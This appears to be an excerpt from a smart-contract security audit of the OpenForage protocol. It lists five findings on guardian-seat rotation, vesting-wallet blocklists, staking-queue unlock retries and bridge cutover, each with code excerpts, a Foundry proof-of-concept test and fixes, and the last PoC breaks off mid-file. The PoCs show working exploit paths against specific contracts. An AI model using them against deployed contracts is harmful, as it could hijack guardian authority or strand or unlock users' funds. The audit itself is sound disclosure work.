### OPEN-69 — A ready accelerated guardian-seat rotation still installs the old successor after timelock retargets the precommitted successor

#### Summary

Four guardians can ready a `SLOT_GUARDIAN_SEAT` rotation to a precommitted successor, but `executeAcceleratedRotation()` never revalidates the live `preCommittedSuccessor` mapping. If timelock retargets the same `(slot, current)` pair before execution, the stale ready operation still installs the superseded successor.

#### Context Files

##### GuardianModule.sol

Path: `src/GuardianModule.sol`
Highlight lines: 1

```solidity
preCommittedSuccessor[slot][current] = successor;
```

##### GuardianModule.sol

Path: `src/GuardianModule.sol`
Highlight lines: 1

```solidity
if (preCommittedSuccessor[slot][current] != successor) revert SuccessorNotPreCommitted();
```

##### GuardianModule.sol

Path: `src/GuardianModule.sol`
Highlight lines: 1

```solidity
rotation.executed = true;
activeSlotHolder[rotation.slot] = rotation.successor;
if (rotation.slot == SLOT_GUARDIAN_SEAT) {
    _replaceGuardianSeat(rotation.current, rotation.successor);
}
```

#### Proof of Concept

1. Ready a guardian-seat rotation to `successorB`.
2. Retarget `preCommittedSuccessor[guardianSeatSlot][guardians[6]]` to `successorC` before execution.
3. Execute the stale ready operation; it still installs `successorB`, and the newer `successorC` operation later reverts `NotGuardian`.

##### cd into project

Path: ``

```bash
cd <public-audit-repo>/openforage_smart_contracts
```

##### POC_GuardianModule_target_bad55e7e.t.sol

Path: `test/POC_GuardianModule_target_bad55e7e.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./GuardianModule.target.t.sol";

/**
 * @title POC: Stale Accelerated Guardian Rotation Survives Timelock Retarget
 * @notice Proof Statement: Proves that once four guardians ready an accelerated guardian-seat rotation to successor B,
 * the timelock can retarget the live `preCommittedSuccessor` entry to successor C, yet `executeAcceleratedRotation`
 * still installs B; after B is installed, the newly precommitted and separately approved rotation to C becomes
 * unexecutable because the old current guardian is no longer a guardian.
 */
contract POC_GuardianModule_target_bad55e7e is GuardianModule_TargetRecovery {
    function test_poc_stale_accelerated_guardian_rotation_survives_retarget() public {
        bytes32 guardianSeatSlot = guardianModule.SLOT_GUARDIAN_SEAT();
        address successorB = makeAddr("guardian-seat-successor-b");
        address successorC = makeAddr("guardian-seat-successor-c");

        vm.prank(timelock);
        guardianModule.setPreCommittedSuccessor(guardianSeatSlot, guardians[6], successorB);

        vm.prank(guardians[0]);
        bytes32 staleOperationId = guardianModule.proposeAcceleratedRotation(guardianSeatSlot, guardians[6], successorB);
        for (uint256 i; i < 4; ++i) {
            vm.prank(guardians[i]);
            guardianModule.approveAcceleratedRotation(staleOperationId);
        }

        vm.prank(timelock);
        guardianModule.setPreCommittedSuccessor(guardianSeatSlot, guardians[6], successorC);

        vm.prank(guardians[0]);
        bytes32 freshOperationId = guardianModule.proposeAcceleratedRotation(guardianSeatSlot, guardians[6], successorC);
        for (uint256 i; i < 4; ++i) {
            vm.prank(guardians[i]);
            guardianModule.approveAcceleratedRotation(freshOperationId);
        }

        vm.warp(guardianModule.acceleratedRotationReadyAt(staleOperationId));
        guardianModule.executeAcceleratedRotation(staleOperationId);

        assertEq(
            guardianModule.preCommittedSuccessor(guardianSeatSlot, guardians[6]),
            successorC,
            "live successor registry was retargeted"
        );
        assertEq(guardianModule.guardianAt(6), successorB, "stale successor still takes the guardian seat");
        assertTrue(guardianModule.isGuardian(successorB), "stale successor inherits guardian authority");

        vm.expectRevert(GuardianModule.NotGuardian.selector);
        guardianModule.executeAcceleratedRotation(freshOperationId);
    }
}

```

##### forge test command

Path: ``

```bash
timeout 300 forge test \
  --match-path test/POC_GuardianModule_target_bad55e7e.t.sol \
  --match-test test_poc_stale_accelerated_guardian_rotation_survives_retarget \
  -vv
```

#### Recommendation

Revalidate the live successor mapping during execution, and cancel or expire operations when timelock changes the precommit. A minimal hardening is:

```solidity
if (preCommittedSuccessor[rotation.slot][rotation.current] != rotation.successor) {
    revert SuccessorNotPreCommitted();
}
```

Also add an explicit cancel path or expiry so timelock can retire stale accelerated operations cleanly.

#### Assumptions

- [x] The timelock had previously precommitted the stale successor.
- [x] Four guardians reached accelerated quorum before timelock retargeted the seat.
- [x] The outgoing guardian still exists when the stale execution occurs.
- [x] The stale successor remains an unintended or attacker-controlled address after governance changes the mapping.

#### Predicted Invalid Reasons

- The successor was valid when the guardians approved it, so executing later is acceptable.

<a id="finding-open-73"></a>
### OPEN-73 — Treasury-created partnership wallets cannot be retrofitted or repaired with a blocklist after deployment

#### Summary

`FORAGETreasury.distributePartnership()` creates `DelegatingVestingWallet` children with the treasury as `_blocklistSetter`, but `setForageToken()` burns `_tokenSetter` before any wallet-local blocklist is wired. Because `FORAGETreasury` has no forwarder to call `setBlocklist()` or `replaceBrokenBlocklist()` on an existing child, treasury-created partnership wallets stay at `blocklist() == address(0)` and lose wallet-local beneficiary screening; a later-blocked beneficiary can still `delegateVotingPower()` unless the wallet address is also blocked.

#### Context Files

##### DelegatingVestingWallet constructor excerpt

Path: `src/DelegatingVestingWallet.sol`
Highlight lines: 1

```solidity
_tokenSetter = tokenSetter_;
_blocklistSetter = tokenSetter_;
```

##### DelegatingVestingWallet maintenance hooks

Path: `src/DelegatingVestingWallet.sol`
Highlight lines: 1

```solidity
function setBlocklist(address blocklist_) external {
    if (msg.sender != _tokenSetter && msg.sender != _blocklistSetter) {
        revert UnauthorizedTokenSetter(msg.sender);
    }
    if (_blocklist != address(0)) revert BlocklistAlreadySet();
    _blocklist = blocklist_;
}

function replaceBrokenBlocklist(address blocklist_) external {
    if (msg.sender != _tokenSetter && msg.sender != _blocklistSetter) {
        revert UnauthorizedTokenSetter(msg.sender);
    }
    if (oldBlocklist == address(0)) revert BlocklistNotSet();
    if (_isHealthyBlocklist(oldBlocklist)) revert BlocklistAlreadySet();
    _blocklist = blocklist_;
```

##### DelegatingVestingWallet token binding

Path: `src/DelegatingVestingWallet.sol`
Highlight lines: 1

```solidity
_forageToken = forageToken_;
_tokenSetter = address(0);
_callDelegate(_delegatee);
```

##### FORAGETreasury partnership deployment

Path: `src/FORAGETreasury.sol`
Highlight lines: 1

```solidity
wallet = address(new DelegatingVestingWallet(beneficiary, start, duration, cliff, address(this)));
DelegatingVestingWallet(wallet).setInitialDelegatee(delegatee);
_forageToken.safeTransfer(wallet, amount);
DelegatingVestingWallet(wallet).precommitForageToken(address(_forageToken));
DelegatingVestingWallet(wallet).setForageToken(address(_forageToken));
```

#### Proof of Concept

The PoC deploys the real contracts and shows the topology gap end-to-end:

1. the treasury-created wallet starts with `blocklist() == address(0)`;
2. blocking only the beneficiary still allows `delegateVotingPower()` while the wallet is unblocked;
3. blocking the wallet address on the shared `Blocklist` immediately freezes both `release()` and delegation.

##### ValidationWalletBlocklistTest

Path: `test/ValidationWalletBlocklist.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import "src/Blocklist.sol";
import "src/FORAGETreasury.sol";
import "src/ForageToken.sol";
import "src/DelegatingVestingWallet.sol";

/**
 * @title Validation: Shared blocklist still freezes treasury-created partnership wallets
 * @notice Proof Statement: Prove that a treasury partnership wallet is deployed with no local
 * vesting-wallet blocklist, so a blocked beneficiary can still re-delegate while the wallet is
 * unblocked, but the existing shared blocklist can immediately freeze the wallet address itself
 * through the token without any treasury upgrade. This disproves the claim that already-created
 * partnership wallets cannot be sanctioned or repaired without a full treasury upgrade.
 */
contract ValidationWalletBlocklistTest is Test {
    address internal owner = makeAddr("owner");
    address internal guardian = makeAddr("guardian");
    address internal team = makeAddr("team");
    address internal partner = makeAddr("partner");
    address internal delegatee1 = makeAddr("delegatee1");
    address internal delegatee2 = makeAddr("delegatee2");

    Blocklist internal blocklist;
    ForageToken internal forage;
    FORAGETreasury internal treasury;

    function setUp() public {
        Blocklist blocklistImplementation = new Blocklist();
        bytes memory blocklistInit = abi.encodeCall(Blocklist.initialize, (guardian, owner));
        blocklist = Blocklist(address(new ERC1967Proxy(address(blocklistImplementation), blocklistInit)));

        ForageToken forageImplementation = new ForageToken();
        bytes memory forageInit = abi.encodeCall(ForageToken.initialize, (team, address(this), owner));
        forage = ForageToken(address(new ERC1967Proxy(address(forageImplementation), forageInit)));

        FORAGETreasury treasuryImplementation = new FORAGETreasury();
        bytes memory treasuryInit = abi.encodeCall(FORAGETreasury.initialize, (address(forage), owner));
        treasury = FORAGETreasury(address(new ERC1967Proxy(address(treasuryImplementation), treasuryInit)));

        vm.startPrank(owner);
        forage.setBlocklist(address(blocklist));
        treasury.setBlocklist(address(blocklist));
        vm.stopPrank();

        assertTrue(forage.transfer(address(treasury), forage.FORAGE_TREASURY_ALLOCATION()));
    }

    function test_sharedBlocklistStillFreezesTreasuryCreatedWallet() public {
        uint64 start = uint64(block.timestamp + 1 days);
        uint64 duration = uint64(365 days);
        uint64 cliff = uint64(30 days);

        vm.prank(owner);
        address wallet = treasury.distributePartnership(partner, delegatee1, 100e18, start, duration, cliff);

        assertEq(DelegatingVestingWallet(wallet).blocklist(), address(0), "treasury-created wallet has no local blocklist");

        vm.prank(guardian);
        blocklist.blockAddress(partner);

        vm.warp(start + cliff);
        vm.prank(partner);
        vm.expectRevert(abi.encodeWithSelector(ForageToken.BlockedAddress.selector, partner));
        DelegatingVestingWallet(wallet).release();

        vm.prank(partner);
        DelegatingVestingWallet(wallet).delegateVotingPower(delegatee2);
        assertEq(forage.delegates(wallet), delegatee2, "blocked beneficiary can still re-delegate while wallet is unblocked");

        vm.prank(guardian);
        blocklist.blockAddress(wallet);

        vm.prank(partner);
        vm.expectRevert(abi.encodeWithSelector(ForageToken.BlockedAddress.selector, wallet));
        DelegatingVestingWallet(wallet).delegateVotingPower(delegatee1);
    }
}
```

#### Recommendation

Preserve a reachable maintenance authority for treasury-created child wallets.

Primary fix:
- Add explicit treasury owner/governance functions that forward `setBlocklist()` and `replaceBrokenBlocklist()` into child wallets, and use them during `distributePartnership()`.

Alternative fixes:
- Give `DelegatingVestingWallet` a dedicated long-lived `blocklistManager` constructor argument instead of reusing `tokenSetter_` for both roles.
- Delay burning `_tokenSetter` until after the child wallet has been wired to the current shared blocklist.

#### Assumptions

- [x] At least one partnership wallet exists in production.
- [x] Governance / owner is expected to rely on the wallet's exposed maintenance hooks for later screening changes.
- [x] A treasury upgrade is materially slower and heavier than an emergency blocklist action.

#### Predicted Invalid Reasons

- This is only an admin UX issue. Governance can upgrade the treasury later, and the token-level blocklist already prevents blocked beneficiaries from receiving FORAGE.

<a id="finding-open-81"></a>
### OPEN-81 — retryForageUnlock can spend a stale entry's lock budget to unlock later priority entries

#### Summary

`StakingQueue.retryForageUnlock()` can reuse a stale `_forageLockedPerEntry[queueId]` against the depositor's current `lockerBalance(account, address(queue))`, so a cancelled or processed priority entry can unlock the FORAGE backing a later active priority entry while that newer entry stays `priority=true`.

#### Context Files

##### StakingQueue unlock cleanup

Path: `openforage_audit_repo/openforage_smart_contracts/src/StakingQueue.sol`
Highlight lines: 1

```solidity
uint256 forageToUnlock = _forageLockedPerEntry[queueId];
if (forageToUnlock > 0) {
    (bool unlockSuccess,) = _forage.call(abi.encodeWithSelector(_SEL_UNLOCK, entry.depositor, forageToUnlock));
    if (unlockSuccess) {
        _forageLockedPerEntry[queueId] = 0;
    } else {
        emit ForageUnlockFailed(entry.depositor, forageToUnlock);
    }
}
```

##### StakingQueue retryForageUnlock excerpt

Path: `openforage_audit_repo/openforage_smart_contracts/src/StakingQueue.sol`
Highlight lines: 1

```solidity
function retryForageUnlock(uint256 queueId) external nonReentrant {
    QueueEntry storage entry = _queueEntries[queueId];
    if (!entry.processed && !entry.cancelled) revert InvalidQueueEntry();
    uint256 forageToUnlock = _forageLockedPerEntry[queueId];
    ...
    (bool balanceKnown, uint256 actualLockerBalance) = _queueLockerBalance(entry.depositor);
    if (balanceKnown && actualLockerBalance > 0 && actualLockerBalance < forageToUnlock) {
        forageToUnlock = actualLockerBalance;
    }
    ...
    (bool unlockSuccess,) = _forage.call(abi.encodeWithSelector(_SEL_UNLOCK, entry.depositor, forageToUnlock));
    if (unlockSuccess) {
        _forageLockedPerEntry[queueId] = 0;
    }
}
```

##### Octane retryForageUnlock regression excerpt

Path: `openforage_audit_repo/openforage_smart_contracts/test/OctaneStakingForageRed.t.sol`
Highlight lines: 1

```solidity
forageLock.setLockedBalance(alice, 25e18);
forageLock.setLockerBalance(alice, address(queue), 25e18);
(bool ok,) = address(queue).call(abi.encodeWithSelector(StakingQueue.retryForageUnlock.selector, queueId));
assertTrue(ok, "retry should reconcile the queue's actual per-locker FORAGE balance");
```

#### Proof of Concept

From the reproduced PoC: create priority entry `A`, let its unlock fail while the queue is deauthorized, clear the stranded token-side lock with `emergencyUnlock(alice, address(queue))`, reauthorize the queue, open fresh priority entry `B`, then call `retryForageUnlock(A)`. The stale retry clears `B`'s live queue locker balance, while `B` remains `priority=true` and is still processed before a standard entry.

##### POC_StakingQueueRetryForageUnlock_77068753.t.sol

Path: `openforage_audit_repo/openforage_smart_contracts/test/POC_StakingQueueRetryForageUnlock_77068753.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../src/StakingQueue.sol";
import "../src/ForageToken.sol";
import "./mocks/MockRISKUSD.sol";
import "./mocks/MockAtRISKUSD.sol";
import "./mocks/MockVaultRegistry.sol";

/**
 * @title POC: retryForageUnlock spends a stale handle on a newer priority entry
 * @notice Proof Statement: Proves that if a priority entry keeps a nonzero `_forageLockedPerEntry`
 * after `cancelQueue()` fails to unlock during a deauthorized-locker recovery flow, then
 * `retryForageUnlock(oldQueueId)` later unlocks the depositor's current aggregate queue locker
 * balance even when that balance belongs entirely to a newer active priority entry. The newer
 * entry remains `priority=true`, is processed ahead of a standard entry, and preserves its own
 * stale `_forageLockedPerEntry` after processing despite having no live FORAGE lock.
 */
contract POC_StakingQueueRetryForageUnlock_77068753 is Test {
    StakingQueue internal queue;
    ForageToken internal forage;
    MockRISKUSD internal riskusd;
    MockAtRISKUSD internal vault0;
    MockAtRISKUSD internal vault1;
    MockAtRISKUSD internal vault2;
    MockAtRISKUSD internal vault3;
    MockVaultRegistry internal vaultRegistry;

    address internal owner;
    address internal teamVesting;
    address internal forageTreasury;
    address internal alice;
    address internal bob;
    address internal anyone;

    uint256 internal constant DEPOSIT_AMOUNT = 1_000_000e6;
    uint256 internal constant REQUIRED_LOCK = 100_000e18;

    function setUp() public {
        owner = makeAddr("owner");
        teamVesting = makeAddr("teamVesting");
        forageTreasury = makeAddr("forageTreasury");
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        anyone = makeAddr("anyone");

        riskusd = new MockRISKUSD();

        ForageToken forageImpl = new ForageToken();
        ERC1967Proxy forageProxy = new ERC1967Proxy(
            address(forageImpl), abi.encodeCall(ForageToken.initialize, (teamVesting, forageTreasury, owner))
        );
        forage = ForageToken(address(forageProxy));

        vault0 = new MockAtRISKUSD(address(riskusd));
        vault1 = new MockAtRISKUSD(address(riskusd));
        vault2 = new MockAtRISKUSD(address(riskusd));
        vault3 = new MockAtRISKUSD(address(riskusd));

        vaultRegistry = new MockVaultRegistry();
        address[4] memory tierVaults = [address(vault0), address(vault1), address(vault2), address(vault3)];
        uint256[4] memory lockups = [uint256(0), uint256(90 days), uint256(180 days), uint256(360 days)];
        uint16[4] memory yieldBps = [uint16(5000), uint16(5500), uint16(6000), uint16(6500)];
        uint16[4] memory fundingBps = [uint16(2000), uint16(2000), uint16(1500), uint16(1500)];
        uint256 vaultId = vaultRegistry.addTestVault(
            "Test Vault", "TV", tierVaults, address(0), 10_000_000e6, lockups, yieldBps, fundingBps
        );

        StakingQueue queueImpl = new StakingQueue();
        ERC1967Proxy queueProxy = new ERC1967Proxy(
            address(queueImpl),
            abi.encodeCall(
                StakingQueue.initialize,
                (address(riskusd), address(forage), tierVaults, address(vaultRegistry), owner)
            )
        );
        queue = StakingQueue(address(queueProxy));

        vm.startPrank(owner);
        queue.setVaultId(vaultId);
        forage.setAuthorizedLocker(address(queue), true);
        queue.setForagePriceUsd(1e6);
        vm.warp(block.timestamp + queue.FINALIZE_DELAY() + 1);
        queue.finalizeForagePriceUsd();
        queue.setPriorityMultiplier(10);
        vm.stopPrank();

        vm.prank(forageTreasury);
        forage.transfer(alice, REQUIRED_LOCK);
    }

    function test_retryForageUnlock_unlocks_newer_priority_lock_and_keeps_priority_processing() public {
        uint256 staleQueueId = _joinQueue(alice, DEPOSIT_AMOUNT, 1);

        assertEq(forage.lockerBalance(alice, address(queue)), REQUIRED_LOCK, "entry A should lock FORAGE");
        assertEq(queue.forageLockedPerEntry(staleQueueId), REQUIRED_LOCK, "entry A should track the original lock");

        vm.prank(owner);
        forage.setAuthorizedLocker(address(queue), false);

        vm.prank(alice);
        queue.cancelQueue(staleQueueId);

        assertTrue(queue.getQueueEntry(staleQueueId).cancelled, "entry A should be cancelled");
        assertEq(queue.forageLockedPerEntry(staleQueueId), REQUIRED_LOCK, "entry A should keep a stale retry budget");
        assertEq(forage.lockerBalance(alice, address(queue)), REQUIRED_LOCK, "token still holds A's stranded lock");

        vm.prank(owner);
        forage.emergencyUnlock(alice, address(queue));

        assertEq(forage.lockerBalance(alice, address(queue)), 0, "recovery clears the original stranded lock");
        assertEq(forage.lockedBalance(alice), 0, "recovery clears aggregate queue lock state");

        vm.prank(owner);
        forage.setAuthorizedLocker(address(queue), true);

        uint256 activePriorityId = _joinQueue(alice, DEPOSIT_AMOUNT, 0);
        uint256 standardId = _joinQueue(bob, 500e6, 0);

        assertTrue(queue.getQueueEntry(activePriorityId).priority, "entry B should be priority");
        assertFalse(queue.getQueueEntry(standardId).priority, "bob should remain standard");
        assertEq(
            queue.forageLockedPerEntry(activePriorityId), REQUIRED_LOCK, "entry B should lock the recovered FORAGE"
        );
        assertEq(
            forage.lockerBalance(alice, address(queue)),
            REQUIRED_LOCK,
            "queue locker balance now belongs only to entry B"
        );

        vm.prank(anyone);
        queue.retryForageUnlock(staleQueueId);

        assertEq(queue.forageLockedPerEntry(staleQueueId), 0, "entry A retry budget should be spent");
        assertEq(
            queue.forageLockedPerEntry(activePriorityId), REQUIRED_LOCK, "entry B still claims a full priority lock"
        );
        assertEq(forage.lockerBalance(alice, address(queue)), 0, "retry A unlocks B's live lock");
        assertEq(forage.lockedBalance(alice), 0, "alice no longer has any queue-backed FORAGE locked");
        assertTrue(
            queue.getQueueEntry(activePriorityId).priority, "entry B remains marked priority after losing its live lock"
        );
        assertEq(queue.priorityRiskusdQueued(alice), DEPOSIT_AMOUNT, "priority accounting still counts entry B");

        queue.processQueue(0, 1);

        assertTrue(
            queue.getQueueEntry(activePriorityId).processed, "entry B is still processed through the priority lane"
        );
        assertFalse(
            queue.getQueueEntry(standardId).processed, "the standard entry waits behind the unbacked priority entry"
        );
        assertEq(
            queue.forageLockedPerEntry(activePriorityId),
            REQUIRED_LOCK,
            "processing B preserves another stale retry handle"
        );
        assertEq(forage.lockerBalance(alice, address(queue)), 0, "entry B finished with no live lock ever restored");
    }

    function _joinQueue(address user, uint256 amount, uint8 tier) internal returns (uint256 queueId) {
        riskusd.mint(user, amount);
        vm.prank(user);
        riskusd.approve(address(queue), amount);
        queueId = queue.nextQueueId();
        vm.prank(user);
        queue.joinQueue(amount, tier);
    }
}

```

#### Recommendation

Bind retries to entry-specific state rather than the depositor's aggregate current queue locker balance. If the queue cannot prove that the live lock still belongs to the historical entry, the retry should revert instead of unlocking arbitrary current balance.

Safer options include:
- storing an explicit per-entry unlockable amount that is decremented only when the same entry's lock is released; or
- refusing retries whenever `entry.priority` is stale relative to `lockerBalance(entry.depositor, address(this))` and the depositor has any later active priority entries.

#### Assumptions

- [x] `StakingQueue` is legitimately deauthorized as a locker at least temporarily, allowing failed unlocks to preserve stale `_forageLockedPerEntry` state.
- [x] The queue is later reauthorized so fresh priority entries can be created again.
- [x] The attacker had at least one priority entry affected during the deauthorization window.

#### Predicted Invalid Reasons

- This only happens if governance deauthorizes the locker incorrectly; `retryForageUnlock` merely helps users recover stuck FORAGE.

<a id="finding-open-71"></a>
### OPEN-71 — Registry bridge cutover can strand reconciled return liquidity on the retired HyperLiquid bridge

#### Summary

`CustodianRegistry.finalizeCustodianConfig()` revokes the retired bridge's accountant role, but the old `HLTradingBridge` can still open withdrawal intents and reconcile arrivals because those entrypoints only use bridge-local roles. If a withdrawal completes after cutover, `returnPrincipalUSDC()` reverts in `CustodianRegistry.recordReturn()`, leaving the USDC and `_reconciledReturnLiquidity` stranded on the retired bridge instead of reaching `RISKUSDVault` or `USDCTreasury`. The `returnPnLUSDC()` path is separate and does not use the registry return hook.

#### Context Files

##### CustodianRegistry cutover roles

Path: `openforage_audit_repo/openforage_smart_contracts/src/CustodianRegistry.sol`
Highlight lines: 1, 5, 8

```solidity
if (!state.exists) {
    state.exists = true;
    _custodianIds.push(id);
} else {
    _setCoreRoles(id, state.bridge, state.executor, false);
}
...
_setCoreRoles(id, config.bridge, config.executor, true);
```

##### HLTradingBridge withdrawal-intent and reconciliation

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1, 2, 4, 7, 8, 10

```solidity
function requestWithdrawalIntent(...) external nonReentrant returns (bytes32 intentId) {
    _requireExecutor();
    ...
    _openWithdrawalIntentId = intentId;
}

function reconcileWithdrawalArrival(bytes32 intentId, uint256 arrivedAmount) external nonReentrant {
    _requireKeeper();
    ...
    _reconciledReturnLiquidity += arrivedAmount;
}
```

##### HLTradingBridge principal return path

Path: `openforage_audit_repo/openforage_smart_contracts/src/hyperliquid/HLTradingBridge.sol`
Highlight lines: 1, 2, 4, 5, 7, 8

```solidity
function returnPrincipalUSDC(uint256 amount) external nonReentrant {
    _requireExecutor();
    ...
    _consumeReconciledLiquidity(token, amount);
    _recordCustodianReturn(amount);
    ...
    IRISKUSDVaultCustodyPort(riskusdVault).returnCapital(amount);
    IUSDCTreasuryReturnPort(usdcTreasury).recordPrincipalReturnUSDC(amount);
}
```

##### CustodianRegistry return accounting gate

Path: `openforage_audit_repo/openforage_smart_contracts/src/CustodianRegistry.sol`
Highlight lines: 1, 2, 3

```solidity
function recordReturn(bytes32 id, uint256 amount) external whenNotPaused onlyCustodianRole(id, ROLE_ACCOUNTANT) {
    uint256 deployed = _applyReturnAccounting(id, amount);
    emit CustodianReturnRecorded(id, amount, deployed);
}
```

#### Proof of Concept

Save the POC as `test/hyperliquid/POC_HLTradingBridge.target.t_2edc8312.sol` and run `forge test --match-path test/hyperliquid/POC_HLTradingBridge.target.t_2edc8312.sol --match-test test_poc_cutoverStrandsReconciledPrincipalOnRetiredBridge -vv`. The test opens a withdrawal intent on the old bridge, rotates the registry bridge, reconciles the arriving USDC, and then confirms `returnPrincipalUSDC()` reverts with `UnauthorizedCustodianRole` while the returned USDC remains on the retired bridge.

##### POC_HLTradingBridgeCutoverStrandsReturns_2edc8312

Path: `test/hyperliquid/POC_HLTradingBridge.target.t_2edc8312.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./HLTradingBridge.target.t.sol";

/**
 * @title POC: Registry cutover strands reconciled returns on the retired bridge
 * @notice Proof Statement: Prove that an already-open withdrawal intent on the retired `HLTradingBridge`
 * can still be reconciled after `CustodianRegistry.finalizeCustodianConfig()` rotates the custodian route
 * to a replacement bridge, but `returnPrincipalUSDC()` then reverts because the retired bridge no longer
 * has the registry's accountant role; the reconciled USDC remains on the retired bridge and does not
 * reach the vault or treasury.
 */
contract POC_HLTradingBridgeCutoverStrandsReturns_2edc8312 is HLTradingBridge_TargetCustody {
    function test_poc_cutoverStrandsReconciledPrincipalOnRetiredBridge() public {
        bytes32 id = custodianRegistry.HYPERLIQUID_CUSTODIAN_ID();
        bytes32 accountantRole = custodianRegistry.ROLE_ACCOUNTANT();

        vm.prank(executor);
        bridge.deployToHyperLiquid(20_000e6);

        vm.prank(executor);
        bytes32 intentId =
            bridge.requestWithdrawalIntent(1_000e6, address(bridge), sourceAccount, WITHDRAWAL_CHAIN_SELECTOR);

        address replacementBridge = makeAddr("replacement-bridge");
        CustodianRegistry.CustodianConfig memory replacementConfig = custodianRegistry.hyperLiquidLaunchConfig(
            replacementBridge, executor, 421_614, sourceAccount, 10_000_000e6
        );

        vm.startPrank(owner);
        custodianRegistry.proposeCustodianConfig(replacementConfig);
        vm.warp(block.timestamp + custodianRegistry.FINALIZE_DELAY());
        custodianRegistry.finalizeCustodianConfig(id);
        vm.stopPrank();

        assertFalse(
            custodianRegistry.hasCustodianRole(id, accountantRole, address(bridge)),
            "cutover must revoke retired bridge accountant role"
        );
        assertEq(bridge.openWithdrawalIntentId(), intentId, "cutover must not clear the old bridge intent");

        uint256 bridgeBalanceBefore = usdc.balanceOf(address(bridge));
        uint256 vaultBalanceBefore = usdc.balanceOf(address(riskusdVault));
        uint256 treasuryBalanceBefore = usdc.balanceOf(address(treasury));

        usdc.mint(address(bridge), 1_000e6);
        vm.prank(keeper);
        bridge.reconcileWithdrawalArrival(intentId, 1_000e6);

        assertEq(bridge.reconciledReturnLiquidity(), 1_000e6, "arrival still becomes reconciled liquidity");
        assertEq(usdc.balanceOf(address(bridge)), bridgeBalanceBefore + 1_000e6, "bridge now holds returned USDC");

        vm.prank(executor);
        vm.expectRevert(
            abi.encodeWithSelector(
                CustodianRegistry.UnauthorizedCustodianRole.selector, id, accountantRole, address(bridge)
            )
        );
        bridge.returnPrincipalUSDC(1_000e6);

        assertEq(bridge.reconciledReturnLiquidity(), 1_000e6, "reconciled liquidity stays stuck after revert");
        assertEq(usdc.balanceOf(address(bridge)), bridgeBalanceBefore + 1_000e6, "principal remains on retired bridge");
        assertEq(usdc.balanceOf(address(riskusdVault)), vaultBalanceBefore, "vault receives nothing");
        assertEq(usdc.balanceOf(address(treasury)), treasuryBalanceBefore, "treasury receives nothing");
        assertEq(custodianRegistry.deployedByCustodian(id), 20_000e6, "registry deployed accounting stays unchanged");
    }
}
```

#### Recommendation

Tie bridge cutover to an explicit drain / disable sequence. At minimum:
- disable new withdrawal intents and arrival reconciliation on a retired bridge once its registry role is revoked;
- or allow the retired bridge to complete returns for already-open intents until `_reconciledReturnLiquidity` is zero;
- or migrate the vault / treasury trust anchors and the registry bridge atomically under one enforced cutover procedure.

#### Assumptions

- [x] Governance performs a registry bridge cutover before the old bridge is fully decommissioned offchain.
- [x] Returned USDC can still arrive on the retired bridge after cutover, including from an in-flight withdrawal or stale operator usage.
- [x] No separate privileged recovery or manual role regrant is performed before the bridge tries to release the funds.

#### Predicted Invalid Reasons

- This only happens if governance rotates the registry bridge before the old bridge is drained or disabled.

<a id="finding-open-83"></a>
### OPEN-83 — Accelerated guardian-seat rotations stay executable after successor revocation

#### Summary

`executeAcceleratedRotation()` replays a stored accelerated guardian-seat rotation without re-checking the live `preCommittedSuccessor` entry. If governance overwrites the successor after four approvals, the old operation still executes, installs the revoked successor, and transfers the outgoing guardian's permissions via `_replaceGuardianSeat()`.

#### Context Files

##### GuardianModule.sol: setPreCommittedSuccessor / proposeAcceleratedRotation

Path: `openforage_audit_repo/openforage_smart_contracts/src/GuardianModule.sol`
Highlight lines: 1

```solidity
function setPreCommittedSuccessor(bytes32 slot, address current, address successor) external {
    if (msg.sender != timelock) revert Unauthorized();
    ...
    preCommittedSuccessor[slot][current] = successor;
    if (activeSlotHolder[slot] == address(0)) {
        activeSlotHolder[slot] = current;
    }
}

function proposeAcceleratedRotation(bytes32 slot, address current, address successor) external returns (bytes32) {
    _requireGuardian(msg.sender);
    if (preCommittedSuccessor[slot][current] != successor) revert SuccessorNotPreCommitted();
    bytes32 operationId = keccak256(abi.encode("accelerated", slot, current, successor));
    Rotation storage rotation = _rotations[operationId];
    if (!rotation.exists) {
        rotation.slot = slot;
        rotation.current = current;
        rotation.successor = successor;
        rotation.proposedAt = block.timestamp;
        rotation.exists = true;
    }
    return operationId;
}
```

##### GuardianModule.sol: executeAcceleratedRotation

Path: `openforage_audit_repo/openforage_smart_contracts/src/GuardianModule.sol`
Highlight lines: 1

```solidity
function executeAcceleratedRotation(bytes32 operationId) external {
    Rotation storage rotation = _rotations[operationId];
    if (rotation.readyAt == 0 || block.timestamp < rotation.readyAt || rotation.executed) {
        revert RotationNotReady();
    }
    rotation.executed = true;
    activeSlotHolder[rotation.slot] = rotation.successor;
    if (rotation.slot == SLOT_GUARDIAN_SEAT) {
        _replaceGuardianSeat(rotation.current, rotation.successor);
    }
}
```

##### GuardianModule.sol: _replaceGuardianSeat

Path: `openforage_audit_repo/openforage_smart_contracts/src/GuardianModule.sol`
Highlight lines: 1

```solidity
function _replaceGuardianSeat(address current, address successor) internal {
    uint256 permissions = guardianPermissions[current];
    if (permissions == 0) revert NotGuardian();
    ...
    guardianPermissions[successor] = permissions;
    guardianPermissions[current] = 0;
}
```

#### Proof of Concept

Add the provided Foundry test, then run `timeout 300 forge test --match-path test/POC_GuardianModule_6cdad6b5.t.sol --match-test test_revokedSuccessorStillInheritsGuardianSeatAndCanPause -vv`. The test pre-commits `staleSuccessor`, gathers four approvals, overwrites the registry to `freshSuccessor`, and still sees `executeAcceleratedRotation()` install `staleSuccessor`, inherit `PERMISSION_CAN_PAUSE`, and pause the target.

##### POC_GuardianModule_6cdad6b5.t.sol

Path: `openforage_audit_repo/openforage_smart_contracts/test/POC_GuardianModule_6cdad6b5.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import "../src/GuardianModule.sol";

contract POC_TargetGovernor {
    address public guardianModule;

